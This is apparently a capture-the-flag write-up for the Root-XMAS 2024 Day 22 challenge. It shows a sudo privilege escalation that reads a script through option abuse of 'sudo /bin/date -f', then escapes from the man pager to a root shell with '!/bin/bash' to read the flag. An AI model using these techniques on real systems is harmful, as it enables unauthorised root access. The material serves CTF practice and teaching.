---
title: Root-XMAS 2024  Day 22 - The date is near
feed: show
permalink: /RootXMAS_2024_22
date: 22-12-2024
summary: hear my arguments
---


### summary


### recon

[gtfobins date page](https://gtfobins.github.io/gtfobins/date/)

option parsing: multiple single chars options are parsed with a single '-'

bruteforce
```bash
for i in {1..128}; do sudo /bin/date -$(printf "\\$(printf %03o "$i")")f /usr/bin/dev.sh; echo $i; done
```

option u:

```bash
sudo /bin/date -uf /usr/bin/dev.sh
	/bin/date: invalid date '#!/bin/bash'
	Tue Dec 24 00:00:00 UTC 2024
	/bin/date: invalid date '# Check if the --debugmyscript argument is present'
	/bin/date: invalid date 'if [[ "$1" != "--debugmyscript" ]]; then'
	/bin/date: invalid date '    exit 0  # Exit silently if the --debugmyscript argument is not provided'
	...
```

```bash
sudo /usr/bin/dev.sh --debugmyscript
	Usage: /usr/bin/dev.sh [options]
	
	Options:
	  -l            List all running processes.
	  -d            Show available disk space.
	  -m            Show the manual for the printf command.
	  -h            Show this help message.

```

[gtfobins man page](https://gtfobins.github.io/gtfobins/man/)

```bash
!!/bin/bash

	ls /root
		flag-1a0a6...1.txt
	cat /root/*.txt
		RM{S4NTA_IS_N0T_4DMIN_SYS}
```
### solution
